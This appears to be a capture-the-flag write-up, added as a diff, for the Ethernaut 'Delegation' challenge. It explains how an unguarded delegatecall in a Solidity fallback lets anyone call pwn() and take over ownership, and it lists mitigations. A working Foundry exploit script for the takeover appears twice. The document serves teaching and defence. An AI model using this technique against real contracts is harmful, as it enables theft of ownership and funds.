@@ -1,0 +1,292 @@
+# Ethernaut Level 6 – Delegation
+
+## Overview
+
+The objective of this challenge is to become the owner of the `Delegation` contract.
+
+The vulnerability lies in the misuse of `delegatecall` inside the contract's `fallback()` function. Any calldata sent to a non-existent function is blindly forwarded to another contract using `delegatecall`, allowing an attacker to execute arbitrary code while modifying the storage of the calling contract.
+
+This challenge demonstrates one of the most important concepts in the EVM: **`delegatecall` executes another contract's code using the caller's storage, address, and balance while preserving the original `msg.sender` and `msg.value`.**
+
+---
+
+# Contract Architecture
+
+The challenge consists of two contracts.
+
+### Delegate
+
+```solidity
+contract Delegate {
+    address public owner;
+
+    function pwn() public {
+        owner = msg.sender;
+    }
+}
+```
+
+### Delegation
+
+```solidity
+contract Delegation {
+    address public owner;
+    Delegate delegate;
+
+    fallback() external {
+        address(delegate).delegatecall(msg.data);
+    }
+}
+```
+
+The `Delegation` contract does **not** implement a `pwn()` function.
+
+Instead, every unknown function call is forwarded to the `Delegate` contract through `delegatecall`.
+
+---
+
+# Root Cause
+
+The vulnerability comes from forwarding arbitrary calldata through:
+
+```solidity
+address(delegate).delegatecall(msg.data);
+```
+
+The contract performs no validation of:
+
+* Function selector
+* Caller
+* Permissions
+* Intended target function
+
+As a result, any function that exists in `Delegate` becomes callable through the `Delegation` contract.
+
+---
+
+# Understanding `delegatecall`
+
+Unlike a normal `call`, `delegatecall` **does not switch execution context**.
+
+Instead, it borrows another contract's code while continuing to use:
+
+* The caller's storage
+* The caller's address
+* The original `msg.sender`
+* The original `msg.value`
+
+Conceptually:
+
+```text
+Caller Storage   ✓
+Caller Address   ✓
+Caller Balance   ✓
+msg.sender       ✓
+
+Only the CODE comes from the target contract.
+```
+
+This behavior makes `delegatecall` extremely powerful—and extremely dangerous when used incorrectly.
+
+---
+
+# Why the Exploit Works
+
+Suppose the attacker calls:
+
+```text
+pwn()
+```
+
+The execution flow is:
+
+```text
+Attacker
+    │
+    ▼
+Delegation
+
+No matching function
+
+    │
+    ▼
+fallback()
+
+    │
+    ▼
+delegatecall(msg.data)
+
+    │
+    ▼
+Delegate.pwn()
+
+    │
+    ▼
+owner = msg.sender
+```
+
+Although `pwn()` belongs to the `Delegate` contract, it executes **inside the storage context of `Delegation`**.
+
+Therefore:
+
+```solidity
+owner = msg.sender;
+```
+
+does **not** modify `Delegate.owner`.
+
+It modifies:
+
+```text
+Delegation.owner
+```
+
+making the attacker the new owner of the vulnerable contract.
+
+---
+
+# Storage Layout
+
+Both contracts declare `owner` as their first state variable.
+
+```text
+Delegate
+
+Slot 0
+┌──────────────┐
+│ owner        │
+└──────────────┘
+```
+
+```text
+Delegation
+
+Slot 0
+┌──────────────┐
+│ owner        │
+└──────────────┘
+
+Slot 1
+┌──────────────┐
+│ delegate     │
+└──────────────┘
+```
+
+Because `delegatecall` writes to the caller's storage, writing to slot `0` inside `Delegate` actually writes to slot `0` of `Delegation`.
+
+This storage layout compatibility is what makes the attack possible.
+
+---
+
+# Exploit
+
+The exploit simply sends the function selector for `pwn()` directly to the `Delegation` contract.
+
+```solidity
+function run() external {
+    vm.startBroadcast(PLAYER_PRIVATE_KEY);
+
+    (bool success,) = address(delegationInstance).call(
+        abi.encodeWithSignature("pwn()")
+    );
+
+    require(success, "call failed");
+
+    vm.stopBroadcast();
+}
+```
+
+No interaction with the `Delegate` contract is required.
+
+The fallback function automatically forwards the calldata using `delegatecall`.
+
+---
+
+# Attack Flow
+
+```text
+Attacker
+    │
+    ▼
+call("pwn()")
+    │
+    ▼
+Delegation
+    │
+    ▼
+fallback()
+    │
+    ▼
+delegatecall(msg.data)
+    │
+    ▼
+Delegate.pwn()
+    │
+    ▼
+owner = msg.sender
+    │
+    ▼
+Writes to Delegation Storage
+    │
+    ▼
+Player becomes owner
+```
+
+---
+
+# Security Impact
+
+Improper use of `delegatecall` can lead to complete compromise of a contract.
+
+An attacker may be able to:
+
+* Take ownership of the contract.
+* Modify arbitrary storage variables.
+* Upgrade implementations maliciously.
+* Bypass access control.
+* Drain protocol funds.
+
+Many upgradeable proxy vulnerabilities originate from incorrect `delegatecall` usage or storage layout mismatches.
+
+---
+
+# Recommended Mitigation
+
+Never forward arbitrary calldata through a fallback function unless implementing a carefully designed proxy pattern.
+
+When using `delegatecall`:
+
+* Restrict who can invoke privileged functionality.
+* Validate function selectors where appropriate.
+* Use audited proxy standards such as **EIP-1967**, **Transparent Proxy**, or **UUPS**.
+* Ensure storage layouts remain compatible between implementation and proxy contracts.
+
+---
+
+# Key Takeaways
+
+* `delegatecall` executes another contract's code **using the caller's storage**.
+* The original `msg.sender` is preserved during execution.
+* Storage slots—not variable names—determine what data is modified.
+* Blindly forwarding calldata through `delegatecall` exposes every compatible function in the implementation contract.
+* A single unrestricted `delegatecall` can allow an attacker to take complete control of a contract.
+
+---
+
+# Exploit Summary
+
+```solidity
+function run() external {
+    vm.startBroadcast(PLAYER_PRIVATE_KEY);
+
+    (bool success,) = address(delegationInstance).call(
+        abi.encodeWithSignature("pwn()")
+    );
+
+    require(success, "call failed");
+
+    vm.stopBroadcast();
+}
+```
+
+By sending the `pwn()` function selector to the `Delegation` contract, the call is routed to the fallback function, which forwards the calldata using `delegatecall`. Since `delegatecall` executes `Delegate.pwn()` within the storage context of `Delegation`, the assignment `owner = msg.sender` overwrites `Delegation`'s owner, transferring ownership to the attacker.
